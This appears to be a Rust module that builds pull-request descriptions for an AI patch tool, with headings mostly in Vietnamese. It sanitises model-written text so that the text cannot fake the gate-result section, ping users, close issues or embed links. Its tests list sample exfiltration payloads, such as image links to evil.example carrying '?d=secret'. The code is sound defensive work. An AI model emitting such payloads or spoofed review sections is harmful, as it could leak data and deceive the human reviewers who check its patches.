//! The PR description of design §6.4. Text written by the model is shown
//! as data: one line per field, no code spans or markup of its own, and
//! mentions, issue references and links broken so the PR cannot ping
//! people, close issues or fake a section such as the gate result.

use std::fmt::Write;

use aegis_gate::{GateReport, Skip, StepName, StepStatus};

/// Longest text kept from one model-written field.
const MAX_FIELD_CHARS: usize = 2000;

/// Change notes listed; the rest are counted.
const MAX_CHANGES: usize = 50;

/// Updated reference files and tests listed each; the rest are counted.
const MAX_REFERENCES: usize = 100;

/// GitHub refuses bodies over 65 536 characters.
const MAX_BODY_CHARS: usize = 60_000;

const ZWSP: char = '\u{200b}';

#[derive(Debug, Clone, PartialEq)]
pub struct ChangeNote {
    /// `file:line` or `file:from-to`.
    pub location: String,
    pub note: String,
}

/// A test the Golden Master rules (design §6.2) allow the patch to change.
#[derive(Debug, Clone, PartialEq)]
pub struct AllowedTestChange {
    pub test: String,
    pub reason: String,
}

/// A group of tests whose reference output (images, hashes) the patch may
/// change together, too many to name one by one (#147).
#[derive(Debug, Clone, PartialEq)]
pub struct AllowedReferenceChange {
    /// The reference directory the gate may rewrite.
    pub references: String,
    /// Test names, `*` matching any run of characters.
    pub tests: String,
    pub reason: String,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Cost {
    pub models: Vec<String>,
    pub model_calls: u32,
    pub usd: f64,
}

#[derive(Debug, Clone)]
pub struct PrContent<'a> {
    pub issue_url: String,
    pub cause: String,
    pub changes: Vec<ChangeNote>,
    pub repro_test: Option<String>,
    pub allowed_test_changes: Vec<AllowedTestChange>,
    pub allowed_reference_changes: Vec<AllowedReferenceChange>,
    pub gate: &'a GateReport,
    pub coverage_percent: Option<f64>,
    pub cost: Cost,
}

/// Bidirectional overrides and isolates, which can make text read
/// differently from what it is.
pub(crate) fn is_bidi(c: char) -> bool {
    matches!(
        c,
        '\u{200e}' | '\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'
    )
}

/// Model text made inert, as one line of at most [`MAX_FIELD_CHARS`]:
/// line breaks and control characters become spaces, bidi controls are
/// dropped, backticks become quotes, `@name`, `#123` and `://` get a
/// zero-width space, and a leading Markdown block marker is escaped. Nothing
/// that Markdown or GitHub turns into a link, an image or an HTML tag
/// survives either (#357): `<`, `&` (entities such as `&colon;` decode to
/// `:`), `](`, a protocol-relative `//` and `www.` get a zero-width space,
/// so a PR cannot make the reader's browser fetch a URL with data in it.
pub fn inert(text: &str) -> String {
    let flat: String = text
        .chars()
        .filter(|c| !is_bidi(*c))
        .map(|c| match c {
            '`' => '\'',
            c if c.is_control() || c.is_whitespace() => ' ',
            c => c,
        })
        .collect();
    let line: Vec<char> = flat
        .split(' ')
        .filter(|w| !w.is_empty())
        .collect::<Vec<_>>()
        .join(" ")
        .chars()
        .take(MAX_FIELD_CHARS)
        .collect();
    let mut out = String::new();
    if line.first().is_some_and(|c| "#>-*+|=~[".contains(*c)) {
        out.push(ZWSP);
    }
    for (i, &c) in line.iter().enumerate() {
        out.push(c);
        let next = line.get(i + 1).copied().unwrap_or(' ');
        let prev = i.checked_sub(1).map_or(' ', |p| line[p]);
        let www = c == '.' && i >= 3 && line[i - 3..i].iter().all(|w| w.eq_ignore_ascii_case(&'w'));
        if (c == '@' && (next.is_ascii_alphanumeric() || next == '-'))
            || (c == '#' && next.is_ascii_digit())
            || (c == ':' && next == '/')
            || (c == '/' && next == '/' && prev != ':')
            || (c == ']' && next == '(')
            || (c == '<' && (next.is_alphabetic() || "/!?".contains(next)))
            || (c == '&' && (next.is_alphanumeric() || next == '#'))
            || www
        {
            out.push(ZWSP);
        }
    }
    out
}

/// The issue link as given when it is a plain `https://` URL, else inert.
fn link(url: &str) -> String {
    let plain = url.starts_with("https://")
        && url.len() <= 500
        && url
            .chars()
            .all(|c| c.is_ascii_graphic() && !"<>`\"'".contains(c));
    if plain { url.to_owned() } else { inert(url) }
}

fn mark(step: &aegis_gate::StepReport, coverage: Option<f64>) -> Option<String> {
    let id = step.name.id();
    Some(match (&step.status, step.name) {
        (StepStatus::Skipped(Skip::NotInProfile | Skip::NoDependencyChange), _) => return None,
        (StepStatus::Passed, StepName::Scope) if step.detail.is_empty() => return None,
        (StepStatus::Passed, StepName::Coverage) => match coverage {
            Some(p) => format!("coverage {p:.1}%"),
            None => "coverage ✔".to_owned(),
        },
        (StepStatus::Passed, StepName::Scope) => "scope ⚠".to_owned(),
        (StepStatus::Passed, _) => format!("{id} ✔"),
        (StepStatus::Failed, _) => format!("{id} ✘"),
        (StepStatus::Skipped(_), _) => format!("{id} –"),
    })
}

/// One line of step results, e.g. `format ✔ · lint ✔ · test ✔ · coverage 82.0%`.
pub fn gate_line(gate: &GateReport, coverage: Option<f64>) -> String {
    gate.steps
        .iter()
        .filter_map(|s| mark(s, coverage))
        .collect::<Vec<_>>()
        .join(" · ")
}

/// `` `a`, `b` ``, the first [`MAX_REFERENCES`] of them; the rest counted.
fn spans(items: &[String]) -> String {
    let mut shown: Vec<String> = items
        .iter()
        .take(MAX_REFERENCES)
        .map(|i| format!("`{}`", inert(i)))
        .collect();
    if items.len() > MAX_REFERENCES {
        shown.push(format!("… và {} khác", items.len() - MAX_REFERENCES));
    }
    shown.join(", ")
}

pub fn render(pr: &PrContent<'_>) -> String {
    let mut out = String::new();
    let _ = write!(out, "## Issue\n{}\n\n", link(&pr.issue_url));
    let _ = write!(out, "## Nguyên nhân\n{}\n\n", inert(&pr.cause));
    out.push_str("## Thay đổi (theo từng đoạn)\n");
    for change in pr.changes.iter().take(MAX_CHANGES) {
        let _ = writeln!(
            out,
            "- `{}` — {}",
            inert(&change.location),
            inert(&change.note)
        );
    }
    if pr.changes.len() > MAX_CHANGES {
        let _ = writeln!(out, "- … and {} more", pr.changes.len() - MAX_CHANGES);
    }
    out.push_str("\n## Test\n");
    match &pr.repro_test {
        Some(test) => {
            let _ = writeln!(out, "- Test tái hiện: `{}` (FAIL → PASS)", inert(test));
        }
        None => out.push_str("- Test tái hiện: không có\n"),
    }
    if pr.allowed_test_changes.is_empty() {
        out.push_str("- Test được phép đổi: không có\n");
    } else {
        out.push_str("- Test được phép đổi:\n");
        for t in &pr.allowed_test_changes {
            let _ = writeln!(out, "  - `{}` — {}", inert(&t.test), inert(&t.reason));
        }
    }
    if !pr.allowed_reference_changes.is_empty() {
        out.push_str("- Nhóm tham chiếu được phép đổi:\n");
        for g in &pr.allowed_reference_changes {
            let _ = writeln!(
                out,
                "  - `{}`, test `{}` — {}",
                inert(&g.references),
                inert(&g.tests),
                inert(&g.reason)
            );
        }
    }
    let updated = &pr.gate.references;
    if !updated.files.is_empty() {
        out.push_str("- Tham chiếu gate đã cập nhật, người duyệt cần xác nhận:\n");
        let _ = writeln!(
            out,
            "  - File ({}): {}",
            updated.files.len(),
            spans(&updated.files)
        );
        let _ = writeln!(
            out,
            "  - Test ({}): {}",
            updated.tests.len(),
            spans(&updated.tests)
        );
    }
    if !pr.gate.scope_warnings.is_empty() {
        out.push_str("\n> [!WARNING]\n> **Cảnh báo phạm vi patch (Patch Scope):**\n");
        for w in &pr.gate.scope_warnings {
            let _ = writeln!(out, "> - {}", inert(w));
        }
        out.push_str("> Người review cần kiểm tra kỹ trước khi duyệt merge.\n");
    }
    let models: Vec<String> = pr.cost.models.iter().map(|m| inert(m)).collect();
    let _ = write!(
        out,
        "\n## Kết quả gate\n{}\n\n## Chi phí\n{} · {} lượt · ${:.2}\n",
        gate_line(pr.gate, pr.coverage_percent),
        models.join(", "),
        pr.cost.model_calls,
        pr.cost.usd
    );
    if out.chars().count() > MAX_BODY_CHARS {
        out = out.chars().take(MAX_BODY_CHARS).collect::<String>() + "\n\n(cut)\n";
    }
    out
}

#[cfg(test)]
mod tests {
    use std::time::Duration;

    use aegis_gate::StepReport;

    use super::*;

    #[test]
    fn model_text_cannot_add_structure() {
        assert_eq!(
            inert("x\n\n## Kết quả gate\nformat ✔"),
            "x ## Kết quả gate format ✔"
        );
        assert_eq!(inert("## heading"), "\u{200b}## heading");
        assert_eq!(inert("a`b` c"), "a'b' c");
        assert_eq!(
            inert("closes https://github.com/o/r/issues/1"),
            "closes https:\u{200b}//github.com/o/r/issues/1"
        );
        assert_eq!(inert("ab\u{202e}cd\u{1b}[1m"), "abcd [1m");
        assert_eq!(
            link("https://github.com/o/r/issues/1"),
            "https://github.com/o/r/issues/1"
        );
        assert_eq!(link("https://x\n## fake"), "https:\u{200b}//x ## fake");
    }

    #[test]
    fn model_text_cannot_make_the_reader_fetch_a_url() {
        let bad = [
            "![x](https://evil.example/a?d=secret)",
            "![x](https&colon;//evil.example/a?d=1)",
            "![x](//evil.example/a)",
            "[x](https&#58;//evil.example)",
            "<img src=\"//evil.example/a\">",
            "<https://evil.example>",
            "see www.evil.example/a",
            "see WWW.evil.example",
        ];
        for text in bad {
            let out = inert(text);
            for needle in [
                "](", "<i", "<h", "&c", "&#", "://", "(//", "\"//", "www.e", "WWW.e",
            ] {
                assert!(!out.contains(needle), "{text} -> {out:?}");
            }
        }
        assert_eq!(inert("a <= b && c<d & e"), "a <= b && c<\u{200b}d & e");
        assert_eq!(
            inert("[ref]: https://x"),
            "\u{200b}[ref]: https:\u{200b}//x"
        );
    }

    #[test]
    fn groups_and_the_references_the_gate_updated_are_listed() {
        let gate = GateReport {
            steps: vec![],
            tree: "t".into(),
            base: "b".into(),
            references: aegis_gate::UpdatedReferences {
                tests: (0..=MAX_REFERENCES).map(|i| format!("math-{i}")).collect(),
                files: vec!["tests/ref/html/hashes.txt".into()],
            },
            parts: vec![String::new()],
            scope_warnings: vec![],
        };
        let body = render(&PrContent {
            issue_url: "https://github.com/o/r/issues/1".into(),
            cause: "c".into(),
            changes: vec![],
            repro_test: None,
            allowed_test_changes: vec![],
            allowed_reference_changes: vec![AllowedReferenceChange {
                references: "tests/ref/html".into(),
                tests: "*".into(),
                reason: "MathML spacing changed\n## fake".into(),
            }],
            gate: &gate,
            coverage_percent: None,
            cost: Cost {
                models: vec![],
                model_calls: 0,
                usd: 0.0,
            },
        });
        assert!(
            body.contains(
                "- Nhóm tham chiếu được phép đổi:\n  \
                 - `tests/ref/html`, test `\u{200b}*` — MathML spacing changed ## fake\n\
                 - Tham chiếu gate đã cập nhật, người duyệt cần xác nhận:\n  \
                 - File (1): `tests/ref/html/hashes.txt`\n  \
                 - Test (101): `math-0`, `math-1`,"
            ),
            "{body}"
        );
        assert!(body.contains("`math-99`, … và 1 khác\n"), "{body}");
        assert!(!body.contains("math-100"), "{body}");
    }

    #[test]
    fn scope_warnings_are_rendered_with_callout() {
        let gate = GateReport {
            steps: vec![
                StepReport {
                    name: StepName::Scope,
                    status: StepStatus::Passed,
                    duration: Duration::ZERO,
                    detail: "changed files (25) exceeded limit (20)".into(),
                    logs: vec![],
                },
                StepReport {
                    name: StepName::Test,
                    status: StepStatus::Passed,
                    duration: Duration::ZERO,
                    detail: String::new(),
                    logs: vec![],
                },
            ],
            tree: "t".into(),
            base: "b".into(),
            references: aegis_gate::UpdatedReferences::default(),
            parts: vec![String::new()],
            scope_warnings: vec![
                "patch changed 25 files, exceeding limit of 20".into(),
                "deleted test file `tests/foo.rs` is not allowed by patch scope policy".into(),
            ],
        };
        let body = render(&PrContent {
            issue_url: "https://github.com/o/r/issues/1".into(),
            cause: "c".into(),
            changes: vec![],
            repro_test: None,
            allowed_test_changes: vec![],
            allowed_reference_changes: vec![],
            gate: &gate,
            coverage_percent: None,
            cost: Cost {
                models: vec![],
                model_calls: 0,
                usd: 0.0,
            },
        });
        assert!(body.contains("> [!WARNING]"), "{body}");
        assert!(
            body.contains("> **Cảnh báo phạm vi patch (Patch Scope):**"),
            "{body}"
        );
        assert!(
            body.contains("> - patch changed 25 files, exceeding limit of 20"),
            "{body}"
        );
        assert!(body.contains("scope ⚠"), "{body}");
    }
}
